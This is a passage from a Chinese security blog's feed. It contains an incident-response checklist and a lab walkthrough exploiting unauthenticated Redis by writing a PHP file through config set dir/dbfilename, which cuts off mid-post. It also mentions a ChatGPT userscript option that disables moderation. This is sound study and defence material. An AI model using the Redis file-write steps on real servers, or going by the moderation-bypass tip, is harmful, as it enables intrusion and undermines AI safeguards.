href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></p></li><li><p>选择你当前的浏览器型号，跳转到浏览器商店安装：</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144344712.png" alt="Tampermonkey官网"></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144443061.png" alt="安装"></p></li></ol><p>安装完成后会提示你已安装</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145144661.png" alt="Tampermonkey成功安装"></p><ul><li>安装<strong>KeepChatGPT</strong></li></ul><p>插件安装成功后，打开 KeepChatGPT 脚本地址：<a href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145332001.png" alt="点击安装KeepChatGPT"></p><p>安装完成后打开<a href="https://chat.openai.com/">https://chat.openai.com/</a></p><p>就能看到左上角出现 KeepChatGPT 的图标，则代表该插件已安装成功。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145526977.png" alt=" KeepChatGPT安装成功"></p><h4 id="5-1-2-基本使用"><a href="#5-1-2-基本使用" class="headerlink" title="5.1.2 基本使用"></a>5.1.2 基本使用</h4><p>把鼠标移动到图标上，会出现 3 个选项。</p><ul><li><p><code>显示调试</code>：主要用于观测脚本的运行过程；</p></li><li><p><code>暗色主题</code>：用于图标的颜色切换；</p></li><li><p><code>取消审计</code>：让 ChatGPT 输出更多丰富的内容，尺度较大</p></li></ul><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145741676.png" alt="基本功能"></p><p>到此，KeepChatGPT就能正常使用了，解决掉因为网络导致 ChatGPT 报错这个问题。</p><h2 id="6-后续"><a href="#6-后续" class="headerlink" title="6. 后续"></a>6. 后续</h2><p>后续会不定期更新一些非常不错的AI相关的应用，以及chatgpt相关插件、AIGC相关的内容。</p><h2 id="7-参考来源"><a href="#7-参考来源" class="headerlink" title="7. 参考来源"></a>7. 参考来源</h2><ol><li><a href="https://chat.openai.com/">https://chat.openai.com</a></li><li><a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg</a></li><li><a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></li><li><a href="https://vercel.com/">https://vercel.com/</a></li><li><a href="https://huggingface.co/">https://huggingface.co</a></li><li><a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></li><li><a href="https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA">https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></li><li><a href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt LLM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应初探</title>
    <link href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h2><ul><li>三要素法：时间、地点、事件</li><li>回溯攻击法：尝试模拟攻击</li><li>经验法：<ul><li>攻击者常用的目录</li><li>黑客惯用手法</li><li>常见恶意程序特征</li></ul></li></ul><h2 id="应急响应阶段"><a href="#应急响应阶段" class="headerlink" title="应急响应阶段"></a>应急响应阶段</h2><p>检测阶段→抑制阶段→根除阶段→恢复阶段→溯源阶段</p><h2 id="应急排查点"><a href="#应急排查点" class="headerlink" title="应急排查点"></a>应急排查点</h2><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/1.png" alt="应急排查点"></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="登录记录"><a href="#登录记录" class="headerlink" title="登录记录"></a>登录记录</h3><ol><li>命令输入: gpedit.msc  </li><li>“计算机配置”→“Windows设置”→“安全设置”→“本地策略”→“审核策略”，双击其中的“审核帐户登陆事件”&#x3D;&#x3D;&gt;审核登录事件–&gt;勾上成功&#x2F;失败–&gt;点击应用–&gt;点击确定</li><li>控制面板–&gt;系统和安全–&gt;查看事件日志–&gt;事件查看器–&gt;windows日志–&gt;安全，便可以看到用户的登录和注销以及账户名等信息</li></ol><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li>基本信息：</li></ul><p>msinfo32、systeminfo</p><ul><li>启动项：</li></ul><ol><li>msconfig</li><li>注册表：Run键值、RunOnce键值、RunServicesOnce健值、RunServices健值、RunOneceEx键值（windows xp&#x2F;2003特有）、load健值、Winlogon健值<ol><li>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</li></ol></li></ol><ul><li>计划任务：<ol><li>compmgmt.msc（计算机管理）下计划任务</li><li>Powershell使用Get-ScheduledTask</li><li>schtasks命令</li></ol></li></ul><h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><ul><li>敏感目录<ul><li>%WINDIR%</li><li>%WINDIR%\system32\</li><li>%TEMP%</li><li>%LOCALAPPDATA%</li><li>%APPDATA% </li><li>各个盘下的temp（tmp）相关目录下查看有无异常文件</li></ul></li><li>特定时间段的文件情况排查<ul><li>查看文件时间，创建时间，修改的时间，访问时间</li><li>对应的linuxd的ctime,mtime,atime</li><li>查看用户的recent相关文件，通过分析最近打开分析可疑文件<ul><li>C:\Documents and Settings\Administrator\Recent</li><li>C:\Documents and Settings\Default User\Recent</li><li>开始，运行 %UserProfile%\Recent</li></ul></li><li>根据文件夹内文件列表时间进行排序，查找可疑文件。也可以搜索指定时间范围内的文件和文件夹</li></ul></li><li>后门文件的排查</li></ul><h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><ul><li>通过任务管理器进行查看<ul><li>映像路径名称</li><li>命令行</li></ul></li><li>tasklist命令<ul><li>tasklist &#x2F;svc    可以显示每个进程和服务的对应情况</li><li>对于某些加载dll的恶意进程，可以通过&#x2F;m参数进行查询。对于要查询特定dll的调用情况，可以使用命令tasklist  &#x2F;m dll 名称</li></ul></li></ul><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/2.png" alt="tasklist命令"></p><ul><li>netstat命令<ul><li>在排查过程中，一般会使用netstat -ano | findstr “ESTABLISHED” 查看目前的网络连接，定位可疑的ESTABLISHED。根据netstat 定位出的pid，再通过tasklist命令进行程序定位</li></ul></li><li>powershell命令<ul><li>Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path</li></ul></li><li>wmic命令进行查询<ul><li>wmic process where name&#x3D;’powershell.exe’ get caption,commadnline,processid,parentprocessid &#x2F;value</li></ul></li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ol><li>通过内置的日志筛选器进行分析，可以通过事件ID，关键字等对日志进行筛选</li><li>通过Powershell对日志进行分析<ol><li>通过powershell进行查询最常用到两个命令是Get-EventLog和Get-WinEvent，两者的区别是GetEventLog只获取传统的事件日志，而Get-WinEvent cmdlet 从包括传统日志（例如系统日志和应用程序日志）在内的事件日志和 Windows Vista 中引入的新 Windows 事件日志技术生成的事件日志中获取事件。</li></ol></li><li>通过相关的日志工具进行分析查询</li></ol><ul><li>主机日志<ul><li>应用程序</li><li>安全性</li><li>系统</li></ul></li><li>其他日志<ul><li>IIS日志</li><li>Apache日志</li><li>Tomcat日志</li></ul></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="查看用户相关分析"><a href="#查看用户相关分析" class="headerlink" title="查看用户相关分析"></a>查看用户相关分析</h3><pre><code class="hljs">  1. useradd userdel 的命令时间变化（stat），以及是否包含可疑信息  2. cat /etc/passwd 分析可以账号，可登录账号</code></pre><h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><h4 id="查看分析history"><a href="#查看分析history" class="headerlink" title="查看分析history"></a>查看分析history</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.bash_history<br></code></pre></td></tr></table></figure><pre><code class="hljs">  1. wget远程某主机（域名&amp;IP）的远控文件；  2. 尝试连接内网某主机（ssh scp），便于分析攻击者意图  3. 打包某敏感数据或代码，tar zip 类命令  4. 对系统进行配置，包含命令修改、远控木马类，可找到攻击者关联信息</code></pre><h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><p>启动项作为恶意病毒的一个常用的驻留手段，以下几个地方可以查找启动项相关的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/rc.local<br>/etc/rc.local<br>rc.local<br>/etc/init.d<br></code></pre></td></tr></table></figure><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ul><li>通过crontab -l 查看当前的任务计划有哪些，也可以指定用户进行查看<ul><li>crontab -u root -l 是root下的计划任务</li></ul></li><li>查看etc目录任务计划相关文件，一般存在计划任务的目录有以下，可以通过浏览下面的计划任务文件的方式来查看计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /etc/cron*<br>crontab -l<br></code></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antlp | more<br></code></pre></td></tr></table></figure><p>如下图所示，为某恶意程序的外链信息。然后根据pid，利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> –alh /proc/pid<br></code></pre></td></tr></table></figure><p>命令查看其对应的可执行程序<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/3.png" alt="ls –alh /proc/pid"><br>也可以利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsof –p pid<br></code></pre></td></tr></table></figure><p>查看pid对应的可执行程序,如果是恶意进程，可以使用kill -9（数字九） 进程的PID值命令来结束进程，如kill -9 2535，然后使用 rm -rf filename 来删除木马，如果root用户都无法删除相关文件，很可能文件被加上了i属性，使用 lsatter filename 命令来查看文件属性，然后使用chattr -i filename 命令来移除i属性继而删除文件；也有的进程因为存在守护进程而无法杀除，可以先把进程挂起，再杀掉守护进程后，再回来把进程杀掉。</p><h4 id="文件痕迹排查-1"><a href="#文件痕迹排查-1" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h4><ul><li>时间点</li></ul><p>find: 在指定目录下查找文件<br>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查找是块设备、目录、字符设备、管道、符号链接、普通文件<br>-mtime -n +n 按文件更改时间来查找文件，-n 指 n天以内，+n 指 n 天前<br>-atime -n +n 按文件访问时间来查找文件，-n 指n 天以内，+n 指 n天前<br>-ctime -n +n 按文件创建时间来查找文件， -n指n天以内，+n指n天前<br>find &#x2F; -ctime 0 -name “*.sh”</p><ul><li>特殊文件</li></ul><p>查找777的权限文件 find &#x2F; *.jsp -perm 777<br>webshell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/4.png" alt="webshell"><br>查看目标系统命令的修改时间：ls -alt &#x2F;bin</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p><strong>var&#x2F;log下的具体功能</strong></p><ul><li>&#x2F;var&#x2F;log&#x2F;wtmp 登录进入，退出，数据交换、关机和重启记录</li><li>&#x2F;var&#x2F;log&#x2F;lastlog 文件记录用户最后登录的信息</li><li>&#x2F;var&#x2F;log&#x2F;secure 记录登入系统存取数据的文件，如 pop3&#x2F;ssh&#x2F;telnet&#x2F;ftp</li><li>&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行</li><li>&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志</li><li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log apache的访问日志</li><li>&#x2F;var&#x2F;log&#x2F;auth.log 包含系统授权信息，包括用户登录和使用的权限机制等</li><li>&#x2F;val&#x2F;log&#x2F;userlog 记录所有登记用户的信息日志</li><li>&#x2F;var&#x2F;log&#x2F;xferlog(vsftp.log)记录linux FTP日志</li><li>&#x2F;var&#x2F;log&#x2F;history 用户登录时间IP为名字的文件, 内容为用户执行命令的日志信息</li><li>&#x2F;var&#x2F;log&#x2F;faillog 记录登录系统不成功的账号信息</li></ul><p><strong>另外</strong></p><pre><code class="hljs">  - last 为登陆成功日志  - lastb为登录失败，可查看是否爆破  - stat 查看日志创建时间  - 如果怀疑某个文件为木马控制端，可直接对文件进行调试查看传递信息</code></pre><p>strace -p pid #调试进程</p><pre><code class="hljs">  - history 或 cat ~/.bash_history 查看历史命令，查找痕迹</code></pre><p><strong>入侵者可能会删除机器的日志信息，可以查看日志信息是否还存在或者是否被清空，相关命令示例：</strong><br>root@ahuan:~# ll -h &#x2F;var&#x2F;log&#x2F;*<br>-rw-r–r–  1 root      root               0 Mar  1 06:25 &#x2F;var&#x2F;log&#x2F;alternatives.log<br>-rw-r–r–  1 root      root             283 Feb 25 09:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.1<br>-rw-r–r–  1 root      root             214 Feb 18 11:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.2.gz<br>-rw-r–r–  1 root      root             477 Dec 20 23:29 &#x2F;var&#x2F;log&#x2F;alternatives.log.3.gz<br>-rw-r–r–  1 root      root            2.0K Nov 30 22:56 &#x2F;var&#x2F;log&#x2F;alternatives.log.4.gz</p><h4 id="恶意流量"><a href="#恶意流量" class="headerlink" title="恶意流量"></a>恶意流量</h4><p>netstat -anlpt 查看是否存在恶意流量（通过威胁情报进行判定是否为恶意域名）<br>查找对应流量连接位置<br>ls -al &#x2F;proc&#x2F;PID (根据查到pid进程输入)</p><p>如 ls -al &#x2F;proc&#x2F;791<br>exe -&gt; 指向启动当前进程的可执行文件（完整路径）的符号链接</p><h2 id="web漏洞应急篇"><a href="#web漏洞应急篇" class="headerlink" title="web漏洞应急篇"></a>web漏洞应急篇</h2><h2 id="Apache-Shiro攻击"><a href="#Apache-Shiro攻击" class="headerlink" title="Apache Shiro攻击"></a>Apache Shiro攻击</h2><p>特征rememberMe<br>恶意 Cookie rememberMe值构造<br>前16字节的密钥 -&gt; 后面加入序列化参数 -&gt; AES加密 -&gt; base64编码 -&gt; 发送cookie</p><p>Apache Shiro处理cookie的流程<br>得到rememberMe的cookie值 -&gt; Base64解码 -&gt; AES-128-CBC解密-&gt; 反序列化(readobject)</p><p><strong>应急流程</strong><br>设备查看告警信息，对remeberMe进行解密，查看反弹IP&#x2F;域名进行进一步溯源，<br>reneberMe管理代码中写道cookie加密密钥默认为AES算法，可以将黑客常用的攻击密钥做一个keylist进行解密，直接在解密内容里查看payload。</p><p>排查思路，该漏洞都是通过remeberMe进行传入payload，直接对日志shiro进行反编译即可查到相关信息（vps、未公开的利用链，特殊的payload）</p><h2 id="Weblogic攻击"><a href="#Weblogic攻击" class="headerlink" title="Weblogic攻击"></a>Weblogic攻击</h2><p>流量层：可以直接查看到访问地址数据包内payload<br>如CVE-2020-2551(iiop)漏洞主要是通过 JtaTransactionManager 来进行加载 LDAP 协议的内容<br><strong>在日志里显示：</strong><br>Weblogic日志主要分为：Server日志、HTTP日志和DOMAIN日志；</p><p>1、Server日志<br>主要功能：记录Weblogic Server启动至关闭过程中的运行信息和错误信息。<br>日志结构：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本。<br>2、DOMAIN日志<br>主要功能：记录一个DOMAIN下的各个Weblogic Server的启动至关闭过程中的运行信息和错误信息。<br>日志结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">####<span class="hljs-tag">&lt;<span class="hljs-name">Oct</span> <span class="hljs-attr">18</span>, <span class="hljs-attr">2018</span> <span class="hljs-attr">2:21:11</span> <span class="hljs-attr">PM</span> <span class="hljs-attr">CST</span>&gt;</span>     &lt;[ACTIVE]ExecuteThread: &#x27;9&#x27; for queue: &#x27;weblogic.kernel.Default (self-tuning)&#x27;&gt; <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> &lt;1539843671288&gt;  <br></code></pre></td></tr></table></figure><p>iiop协议不会在http请求中有记录，应急主要注意domain日志的记录</p><p>应急流程：<br><strong>t3协议</strong><br>临时处置方式：<br>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源<br>漏洞列表：<br>CVE-2017-3248<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2019-2890<br>CVE-2020-2555<br><strong>iiop协议</strong><br>临时处置：<br>1.及时更新补丁<br>2.通过 Weblogic 控制台进行关闭 IIOP 协议<br>漏洞列表：<br>CVE-2020-2551</p><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>1.写webshell<br>2.写ssh密钥<br>3.写计划任务反弹shell</p><h3 id="应急流程："><a href="#应急流程：" class="headerlink" title="应急流程："></a>应急流程：</h3><p>查看配置信息是否存在异常（根据显示信息可判断是哪种攻击方式）<br>config get *<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/5.png" alt="config get *"><br>写ssh密钥<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/6.png" alt="写ssh密钥"><br>反弹shell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/7.png" alt="反弹shell"><br>写文件路径<br>查看key信息是否有攻击队特征信息<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="查看key信息是否有攻击队特征信息"><br>如果发现攻击队正在操作redis，可以使用 monitor命令进行检测<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="monitor命令进行检测"></p><h2 id="冰蝎与内存马攻击"><a href="#冰蝎与内存马攻击" class="headerlink" title="冰蝎与内存马攻击"></a>冰蝎与内存马攻击</h2><ul><li>冰蝎</li></ul><p>特征：后缀为动态脚本（jsp、asp、php） 请求体加密状态</p><ul><li>内存马</li></ul><p>攻击特征：没有落地文件通常以 <a href="http://url.com/xxx/">http://url.com/xxx/</a> (直接以某个文件夹为路径)<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/10.png" alt="内存马"><br><strong>应急思路</strong><br>针对webshell，可直接对web路径下查找动态脚本文件，也可以直接搜索文件内特征值<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/11.png" alt="find / -name *.jsp*"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name *.jsp | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p>（pass为特征值，可以修改。如果返回内容过多可自行修改特征）</p><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/12.png" alt="pass特征"><br>对于内存马，虽然现在有各种文章分析如何提取，但最简单的方法还是重启解决问题。<br>如果想知道如何手动清理，请移步至：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247485680&idx=1&sn=bbd2bd94da7720c6567c462c8559cfdd&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a><br>修复建议：<br>1.根据漏洞来定，如果是程序漏洞修复即可<br>2.上传漏洞，禁止上传动态脚本文件，采用白名单机制仅允许特定后缀上传</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a></li><li><a href="https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g">https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g</a></li><li><a href="https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw">https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问初探</title>
    <link href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞产生的条件：</p><ol><li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ol><h3 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2 漏洞危害"></a>2 漏洞危害</h3><ol><li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； </li><li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； </li><li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li></ol><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><ul><li>漏洞环境<ul><li>靶机ip：192.168.0.110</li><li>攻击机ip：192.168.0.111</li></ul></li></ul><p>使用命令启动redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server /etc/redis-conf<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png"></p><p>启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png"><br /> </p><h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接redis</span><br><br>redis-cli -h ip -p 6379 -a passwd<br><br><span class="hljs-comment">#查看redis版本信息等</span><br><br>info<br><br><span class="hljs-comment">#列出当前数据库中所有的键</span><br><br>keys *<br><br><span class="hljs-comment"># 删除所有数据(谨慎使用)</span><br><br>flushall<br><br><span class="hljs-comment"># 设置主从关系</span><br><br>slaveof ip port<br><br><span class="hljs-comment">#设置一个键的值</span><br><br>SET key value<br><br><span class="hljs-comment">#获取一个建的值</span><br><br>GET key <br></code></pre></td></tr></table></figure><h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png"><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p><h4 id="4-1-利用redis写webshell"><a href="#4-1-利用redis写webshell" class="headerlink" title="4.1 利用redis写webshell"></a>4.1 利用redis写webshell</h4><p><strong>利用前提</strong>：</p><ol><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li><li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</li></ol><p>这里由于本地搭建，我们已经知道目录，我们把shell写入&#x2F;home&#x2F;ali目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /home/ali<br>config <span class="hljs-built_in">set</span> dbfilename redis.php<br><span class="hljs-built_in">set</span> wenshell <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png"></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png"></p><p>因为直接这样写会乱码。所以改良一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></code></pre></td></tr></table></figure><p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img 